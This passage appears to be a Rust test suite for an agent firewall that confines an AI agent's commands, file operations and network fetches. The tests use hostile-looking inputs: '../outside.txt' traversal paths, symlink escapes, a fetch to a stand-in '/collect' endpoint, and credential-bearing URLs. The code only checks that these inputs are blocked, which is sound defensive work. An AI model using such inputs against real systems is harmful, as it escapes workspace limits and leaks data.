                seq: 1,
                command: "printf guarded > result.txt".into(),
                workspace: directory.path().to_path_buf(),
                network: NetworkPolicy::Deny,
                timeout: Duration::from_secs(5),
                max_output_bytes: 1024,
            },
        )
        .await
        .unwrap();
        assert_eq!(result.decision.verdict, AdapterVerdict::Allow);
        assert_eq!(result.execution.status, Some(0));
        assert_eq!(
            std::fs::read_to_string(directory.path().join("result.txt")).unwrap(),
            "guarded"
        );
    }

    #[tokio::test]
    async fn guarded_file_write_is_confined_to_the_workspace() {
        let directory = tempfile::tempdir().unwrap();
        let mut firewall = AgentFirewall::with_default_policy();
        let result = run_guarded_file_write(
            &mut firewall,
            GuardedFileWriteSpec {
                session: "write-allow".into(),
                agent: "root".into(),
                seq: 1,
                path: PathBuf::from("notes/result.txt"),
                content: "typed write".into(),
                workspace: directory.path().to_path_buf(),
            },
        )
        .await;
        // The adapter requires existing parent directories; this first call
        // proves that a missing parent fails without creating anything.
        assert!(result.is_err());
        assert!(!directory.path().join("notes").exists());

        std::fs::create_dir(directory.path().join("notes")).unwrap();
        let result = run_guarded_file_write(
            &mut firewall,
            GuardedFileWriteSpec {
                session: "write-allow".into(),
                agent: "root".into(),
                seq: 2,
                path: PathBuf::from("notes/result.txt"),
                content: "typed write".into(),
                workspace: directory.path().to_path_buf(),
            },
        )
        .await
        .unwrap();
        assert_eq!(result.decision.verdict, AdapterVerdict::Allow);
        assert_eq!(result.bytes_written, 11);
        assert_eq!(
            std::fs::read_to_string(directory.path().join("notes/result.txt")).unwrap(),
            "typed write"
        );
    }

    #[tokio::test]
    async fn guarded_file_write_rejects_traversal_and_symlink_targets() {
        let directory = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        std::fs::write(outside.path().join("outside.txt"), "unchanged").unwrap();
        let mut firewall = AgentFirewall::with_default_policy();

        let traversal = run_guarded_file_write(
            &mut firewall,
            GuardedFileWriteSpec {
                session: "write-boundary".into(),
                agent: "root".into(),
                seq: 1,
                path: PathBuf::from("../outside.txt"),
                content: "must not escape".into(),
                workspace: directory.path().to_path_buf(),
            },
        )
        .await
        .unwrap_err()
        .to_string();
        assert!(traversal.contains("path traversal"));
        assert_eq!(
            std::fs::read_to_string(outside.path().join("outside.txt")).unwrap(),
            "unchanged"
        );

        #[cfg(unix)]
        {
            std::os::unix::fs::symlink(
                outside.path().join("outside.txt"),
                directory.path().join("link.txt"),
            )
            .unwrap();
            let symlink = run_guarded_file_write(
                &mut firewall,
                GuardedFileWriteSpec {
                    session: "write-boundary".into(),
                    agent: "root".into(),
                    seq: 2,
                    path: PathBuf::from("link.txt"),
                    content: "must not follow".into(),
                    workspace: directory.path().to_path_buf(),
                },
            )
            .await
            .unwrap_err()
            .to_string();
            assert!(symlink.contains("symlink"));
            assert_eq!(
                std::fs::read_to_string(outside.path().join("outside.txt")).unwrap(),
                "unchanged"
            );
        }
    }

    #[tokio::test]
    async fn guarded_file_delete_and_rename_stay_inside_the_workspace() {
        let workspace = tempfile::tempdir().unwrap();
        std::fs::create_dir(workspace.path().join("notes")).unwrap();
        std::fs::write(workspace.path().join("notes/old.txt"), "remove me").unwrap();
        std::fs::write(workspace.path().join("notes/move.txt"), "keep me").unwrap();
        let outside = tempfile::tempdir().unwrap();
        std::fs::write(outside.path().join("outside.txt"), "unchanged").unwrap();
        let mut firewall = AgentFirewall::with_default_policy();

        let renamed = run_guarded_file_rename(
            &mut firewall,
            GuardedFileRenameSpec {
                session: "write-boundary".into(),
                agent: "root".into(),
                seq: 1,
                from: PathBuf::from("notes/move.txt"),
                to: PathBuf::from("notes/moved.txt"),
                workspace: workspace.path().to_path_buf(),
            },
        )
        .await
        .unwrap();
        assert_eq!(renamed.decision.verdict, AdapterVerdict::Allow);
        assert!(renamed.renamed);
        assert!(!workspace.path().join("notes/move.txt").exists());
        assert_eq!(
            std::fs::read_to_string(workspace.path().join("notes/moved.txt")).unwrap(),
            "keep me"
        );

        let deleted = run_guarded_file_delete(
            &mut firewall,
            GuardedFileDeleteSpec {
                session: "write-boundary".into(),
                agent: "root".into(),
                seq: 2,
                path: PathBuf::from("notes/old.txt"),
                workspace: workspace.path().to_path_buf(),
            },
        )
        .await
        .unwrap();
        assert_eq!(deleted.decision.verdict, AdapterVerdict::Allow);
        assert!(deleted.deleted);
        assert!(!workspace.path().join("notes/old.txt").exists());

        let escape = run_guarded_file_rename(
            &mut firewall,
            GuardedFileRenameSpec {
                session: "write-boundary".into(),
                agent: "root".into(),
                seq: 3,
                from: PathBuf::from("notes/moved.txt"),
                to: PathBuf::from("../outside.txt"),
                workspace: workspace.path().to_path_buf(),
            },
        )
        .await
        .unwrap_err()
        .to_string();
        assert!(escape.contains("path traversal"));
        assert_eq!(
            std::fs::read_to_string(outside.path().join("outside.txt")).unwrap(),
            "unchanged"
        );
    }

    #[tokio::test]
    async fn guarded_file_mutations_fail_closed_when_policy_denies() {
        let workspace = tempfile::tempdir().unwrap();
        std::fs::write(workspace.path().join("old.txt"), "keep").unwrap();
        let policy = AgentPolicySet::from_yaml(
            "agent_policies:\n  - name: deny-side-effects\n    when: { min_action_class: side_effecting }\n    action: deny\ndefault: allow\n",
        )
        .unwrap();
        let mut firewall = AgentFirewall::new(policy, DEFAULT_TAINT_CAP);

        let delete = run_guarded_file_delete(
            &mut firewall,
            GuardedFileDeleteSpec {
                session: "deny-boundary".into(),
                agent: "root".into(),
                seq: 1,
                path: PathBuf::from("old.txt"),
                workspace: workspace.path().to_path_buf(),
            },
        )
        .await
        .unwrap_err()
        .to_string();
        assert!(delete.contains("verdict=deny"));
        assert!(workspace.path().join("old.txt").exists());

        let rename = run_guarded_file_rename(
            &mut firewall,
            GuardedFileRenameSpec {
                session: "deny-boundary".into(),
                agent: "root".into(),
                seq: 2,
                from: PathBuf::from("old.txt"),
                to: PathBuf::from("new.txt"),
                workspace: workspace.path().to_path_buf(),
            },
        )
        .await
        .unwrap_err()
        .to_string();
        assert!(rename.contains("verdict=deny"));
        assert!(workspace.path().join("old.txt").exists());
        assert!(!workspace.path().join("new.txt").exists());
    }

    #[tokio::test]
    async fn guarded_network_fetch_uses_the_proxy_and_bounds_the_response() {
        let proxy = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/safe"))
            .respond_with(ResponseTemplate::new(200).set_body_string("trusted-looking input"))
            .expect(2)
            .mount(&proxy)
            .await;

        let policy =
            AgentPolicySet::from_yaml("egress_allowlist:\n  - localhost\ndefault: allow\n")
                .unwrap();
        let mut firewall = AgentFirewall::new(policy, DEFAULT_TAINT_CAP);
        let result = run_guarded_network_fetch(
            &mut firewall,
            GuardedNetworkFetchSpec {
                session: "fetch-allow".into(),
                agent: "root".into(),
                seq: 1,
                // Nothing is listening on port 9. A successful response proves
                // reqwest used the configured proxy instead of direct I/O.
                url: "http://localhost:9/safe".into(),
                proxy_url: proxy.uri(),
                timeout: Duration::from_secs(5),
                max_response_bytes: 1024,
            },
        )
        .await
        .unwrap();

        assert_eq!(result.decision.verdict, AdapterVerdict::Allow);
        assert_eq!(result.host, "localhost");
        assert_eq!(result.status, 200);
        assert_eq!(result.body, "trusted-looking input");
        assert!(!result.body_truncated);

        let bounded = run_guarded_network_fetch(
            &mut firewall,
            GuardedNetworkFetchSpec {
                session: "fetch-bound".into(),
                agent: "root".into(),
                seq: 2,
                url: "http://localhost:9/safe".into(),
                proxy_url: proxy.uri(),
                timeout: Duration::from_secs(5),
                max_response_bytes: 7,
            },
        )
        .await
        .unwrap_err()
        .to_string();
        assert!(bounded.contains("response exceeds the configured limit"));
    }

    #[tokio::test]
    async fn guarded_network_fetch_refuses_unknown_hosts_before_proxy_io() {
        let proxy = MockServer::start().await;
        Mock::given(method("GET"))
            .respond_with(ResponseTemplate::new(200).set_body_string("must not reach proxy"))
            .expect(0)
            .mount(&proxy)
            .await;

        let mut firewall = AgentFirewall::with_default_policy();
        let error = run_guarded_network_fetch(
            &mut firewall,
            GuardedNetworkFetchSpec {
                session: "fetch-deny".into(),
                agent: "root".into(),
                seq: 1,
                url: "https://not-allowlisted.invalid/collect".into(),
                proxy_url: proxy.uri(),
                timeout: Duration::from_secs(5),
                max_response_bytes: 1024,
            },
        )
        .await
        .unwrap_err()
        .to_string();
        assert!(error.contains("guarded network fetch refused"));
        assert!(!error.contains("not-allowlisted.invalid"));
    }

    #[tokio::test]
    async fn guarded_network_fetch_requires_a_policy_egress_allowlist() {
        let proxy = MockServer::start().await;
        let policy = AgentPolicySet::from_yaml("default: allow\n").unwrap();
        let mut firewall = AgentFirewall::new(policy, DEFAULT_TAINT_CAP);
        let error = run_guarded_network_fetch(
            &mut firewall,
            GuardedNetworkFetchSpec {
                session: "fetch-no-list".into(),
                agent: "root".into(),
                seq: 1,
                url: "http://localhost:9/safe".into(),
                proxy_url: proxy.uri(),
                timeout: Duration::from_secs(5),
                max_response_bytes: 1024,
            },
        )
        .await
        .unwrap_err()
        .to_string();
        assert!(error.contains("not on the egress allowlist"));
    }

    #[test]
    fn guarded_network_urls_fail_closed_on_insecure_or_ambiguous_inputs() {
        assert!(validate_fetch_url("http://example.com/unsafe").is_err());
        assert!(validate_fetch_url("https://user:pass@example.com/unsafe").is_err());
        assert!(validate_fetch_url("https://example.com/unsafe#fragment").is_err());
        assert!(validate_proxy_url("http://example.com/").is_err());
        assert!(validate_proxy_url("https://proxy.example/path").is_err());
        assert!(validate_proxy_url("http://127.0.0.1:8080/").is_ok());
    }
}
